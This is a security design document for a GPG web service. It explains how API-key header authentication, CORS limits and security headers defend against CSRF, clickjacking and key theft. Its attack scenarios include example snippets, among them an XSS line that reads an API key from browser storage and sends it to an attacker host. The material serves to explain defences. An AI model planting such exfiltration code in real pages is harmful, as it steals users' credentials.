# CSRF Protection via API Keys

This document explains how the GPG Webservice protects against Cross-Site Request Forgery (CSRF) attacks using API key authentication.

## Overview

The GPG Webservice is designed as an **API-only service** for OpenAI function calling and programmatic access. It does not use cookie-based sessions or web forms, which eliminates the primary attack vector for CSRF.

## Why Traditional CSRF Attacks Don't Work

### Cookie-Based Sessions (Vulnerable to CSRF)

Traditional web applications use cookies for session management:

```http
GET /sensitive-action HTTP/1.1
Host: example.com
Cookie: session=abc123
```

**CSRF Attack:** An attacker can trick a victim's browser into making this request because:
1. Browsers automatically include cookies with requests
2. The server trusts requests with valid cookies
3. Attacker cannot read the response, but can trigger the action

### API Key Authentication (Resistant to CSRF)

Our service requires API keys in request headers:

```http
POST /sign HTTP/1.1
Host: gpg-webservice.com
X-API-KEY: sk_1234567890abcdef
Content-Type: application/json
```

**CSRF Protection:** Attackers cannot forge these requests because:
1. Browsers do not automatically include custom headers
2. JavaScript from other origins cannot set custom headers due to CORS
3. API keys must be explicitly included by the client application

## API Key Security Model

### Authentication Method

All protected endpoints require the `X-API-KEY` header:

```python
@require_api_key
def sign(user, raw_api_key):
    # API key validated before this function is called
    # ...
```

### No Cookie/Session Storage

The service does **not** use:
- HTTP cookies
- Session cookies
- Browser localStorage for authentication
- Any browser-based authentication mechanism

### Explicit Authorization

Every request must explicitly include the API key:

```bash
curl -X POST https://gpg-webservice.com/sign \
  -H "X-API-KEY: sk_1234567890abcdef" \
  -F "file=@document.txt"
```

## CORS Configuration

### Default CORS Policy

By default, the service does not enable CORS, which means:

- Only same-origin requests are allowed
- Cross-origin requests are blocked by browsers
- This provides an additional layer of protection

### If CORS Is Enabled

If CORS is configured for specific use cases, the service MUST:

1. **Whitelist specific origins** - Never use `Access-Control-Allow-Origin: *`
2. **Disallow credentials** - Set `Access-Control-Allow-Credentials: false`
3. **Validate Origin header** - Check against allowed origins list

Example secure CORS configuration:

```python
from flask_cors import CORS

ALLOWED_ORIGINS = [
    'https://trusted-app.example.com',
    'https://openai-function-caller.example.com'
]

CORS(app,
     origins=ALLOWED_ORIGINS,
     allow_headers=['Content-Type', 'X-API-KEY'],
     supports_credentials=False)
```

## Attack Scenarios and Mitigations

### Scenario 1: Malicious Website Attempts CSRF

**Attack:**
```html
<!-- Attacker's website -->
<script>
fetch('https://gpg-webservice.com/sign', {
    method: 'POST',
    headers: {
        'X-API-KEY': 'stolen-key'  // Even if attacker has key
    },
    body: formData
});
</script>
```

**Mitigation:**
- CORS blocks the request (different origin)
- Browser prevents cross-origin requests without CORS headers
- Even if CORS is enabled, attacker needs the victim's API key
- API keys are not stored in browser cookies, so attacker cannot access them

### Scenario 2: XSS Injection Attempts API Key Theft

**Attack:**
```html
<script>
// Attacker tries to steal API key
var apiKey = localStorage.getItem('api_key');
fetch('https://attacker.com/steal?key=' + apiKey);
</script>
```

**Mitigation:**
- Service documentation explicitly warns against storing API keys in browser storage
- API keys should be stored server-side in environment variables
- Recommended client architecture uses backend proxy:

```
[Browser] → [Client Backend] → [GPG Webservice]
                ↑ API key stored here
```

### Scenario 3: Clickjacking Attack

**Attack:**
```html
<!-- Attacker's page -->
<iframe src="https://gpg-webservice.com/sign" style="opacity:0"></iframe>
```

**Mitigation:**
- `X-Frame-Options: DENY` header prevents framing
- Content Security Policy prevents embedding
- Service is API-only, no web UI to clickjack

## API Key Best Practices

### For Service Operators

1. **Enforce HTTPS Only**
   - API keys transmitted over encrypted connections only
   - Configured via `HSTS` header

2. **Rate Limiting**
   - Prevents brute force API key guessing
   - See [routes/user_routes.py](routes/user_routes.py#L13) and [routes/gpg_routes.py](routes/gpg_routes.py#L63)

3. **API Key Hashing**
   - API keys stored as SHA256 hashes
   - Raw keys never stored in database
   - See [services/auth_service.py](services/auth_service.py#L70)

4. **Audit Logging**
   - All authentication attempts logged
   - Failed attempts trigger alerts
   - See [utils/audit_logger.py](utils/audit_logger.py)

### For Service Users

1. **Never store API keys in browser code**
   ```javascript
   // ❌ WRONG - Exposed in client code
   const API_KEY = 'sk_1234567890abcdef';

   // ✅ CORRECT - Backend handles API key
   fetch('/api/proxy/sign', { ... });
   ```

2. **Use environment variables**
   ```python
   # ✅ CORRECT
   import os
   API_KEY = os.environ.get('GPG_WEBSERVICE_API_KEY')
   ```

3. **Rotate keys regularly**
   - Generate new API keys periodically
   - Revoke old keys after rotation
   - Use separate keys for different environments (dev/staging/prod)

4. **Use backend proxy for web applications**
   ```
   User Browser → Your Backend → GPG Webservice
                   (API key here)
   ```

## OpenAI Function Calling Integration

### Secure Architecture

For OpenAI function calling, use a backend proxy:

```
OpenAI API → Your Backend → GPG Webservice
              ↑ API key stored here
```

**Never** expose the GPG Webservice API key to OpenAI or client browsers.

### Example Secure Implementation

```python
# Your backend server
from flask import Flask, request
import os
import requests

app = Flask(__name__)
GPG_API_KEY = os.environ.get('GPG_WEBSERVICE_API_KEY')

@app.route('/proxy/sign', methods=['POST'])
@require_authentication  # Your own auth
def proxy_sign():
    # Forward request to GPG webservice with API key
    response = requests.post(
        'https://gpg-webservice.com/sign',
        headers={'X-API-KEY': GPG_API_KEY},
        files=request.files
    )
    return response.json(), response.status_code
```

## Security Headers

The service implements multiple security headers to provide defense in depth:

### X-Frame-Options
```http
X-Frame-Options: DENY
```
Prevents clickjacking by disallowing framing.

### Content-Security-Policy
```http
Content-Security-Policy: default-src 'self'
```
Restricts resource loading to same origin.

### Strict-Transport-Security
```http
Strict-Transport-Security: max-age=31536000; includeSubDomains
```
Enforces HTTPS connections.

### X-Content-Type-Options
```http
X-Content-Type-Options: nosniff
```
Prevents MIME type sniffing attacks.

See [utils/security_utils.py](utils/security_utils.py#L217) for implementation.

## Comparison: CSRF Tokens vs API Keys

| Feature | CSRF Tokens | API Keys (This Service) |
|---------|-------------|-------------------------|
| Storage | Server-side session | Database (hashed) |
| Transmission | Hidden form fields | HTTP headers |
| Automatic inclusion | Yes (in forms) | No (explicit header) |
| CSRF protection | Required for cookies | Built-in protection |
| Browser support | All browsers | All HTTP clients |
| Use case | Web forms | API/Programmatic access |

## Audit and Monitoring

### Failed Authentication Attempts

All failed API key validations are logged:

```python
audit_logger.log_event(
    AuditEventType.INVALID_API_KEY,
    status='failure',
    message='Invalid API key attempted'
)
```

### Rate Limiting

API endpoints are rate-limited to prevent abuse:

- Authentication endpoints: 5 requests per minute per IP
- API endpoints: 30 requests per minute per IP

See [config.py](config.py) for configuration.

### Monitoring Recommendations

1. **Alert on repeated authentication failures** from the same IP
2. **Monitor for unusual access patterns** (time, location, volume)
3. **Track API key usage** to detect compromised keys
4. **Review audit logs** regularly for suspicious activity

## Incident Response

If an API key is compromised:

1. **Immediately revoke the key** (currently requires database access)
2. **Generate a new API key** for the affected user
3. **Review audit logs** for unauthorized activity
4. **Assess impact** of any unauthorized operations
5. **Notify affected parties** if data was accessed

## References

- [OWASP CSRF Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html)
- [API Security Best Practices](https://owasp.org/www-project-api-security/)
- [OpenAI Function Calling Security](https://platform.openai.com/docs/guides/function-calling)

## Conclusion

The GPG Webservice's API-only architecture with API key authentication provides robust protection against CSRF attacks:

1. ✅ No cookie-based authentication
2. ✅ Explicit API key headers required
3. ✅ CORS restrictions prevent cross-origin requests
4. ✅ Security headers provide defense in depth
5. ✅ Comprehensive audit logging
6. ✅ Rate limiting prevents abuse

This design is inherently more secure against CSRF than traditional cookie-based web applications.
